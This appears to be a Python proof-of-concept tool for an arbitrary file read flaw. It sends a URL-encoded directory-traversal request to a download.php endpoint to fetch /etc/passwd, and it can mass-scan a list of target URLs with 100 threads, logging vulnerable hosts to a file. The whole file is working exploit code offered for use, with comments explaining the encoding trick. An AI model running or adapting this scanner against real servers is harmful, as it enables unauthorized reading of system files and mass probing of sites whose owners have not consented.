# -*- coding: utf-8 -*-

import argparse
import sys
import requests
from multiprocessing.dummy import Pool  # 表示的是多线程

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
    
 █████╗ ███╗   ██╗██╗   ██╗    ███████╗██╗██╗     ███████╗    ██████╗ ███████╗ █████╗ ██████╗ 
██╔══██╗████╗  ██║╚██╗ ██╔╝    ██╔════╝██║██║     ██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗
███████║██╔██╗ ██║ ╚████╔╝     █████╗  ██║██║     █████╗      ██████╔╝█████╗  ███████║██║  ██║
██╔══██║██║╚██╗██║  ╚██╔╝      ██╔══╝  ██║██║     ██╔══╝      ██╔══██╗██╔══╝  ██╔══██║██║  ██║
██║  ██║██║ ╚████║   ██║       ██║     ██║███████╗███████╗    ██║  ██║███████╗██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       ╚═╝     ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                                                              
                                                        tag:  An any file read poc
                                                        @version: 1.0.0
                                                        @author:  Nian-stars

    """
    print(test)


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "Safari/537.36",
}


def poc(target):
    url = target + "/download.php?file=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" # 利用%2e来代替"."完成目录穿越
    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5).text
        if "root" in res:
            print(f"[+] {target} is vulnerable!")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[+] {target} is not vulnerable!")
    except:
        pass


def main():
    banner()
    parser = argparse.ArgumentParser(description='An any file read poc')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)  # 表示的是线程数为100
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
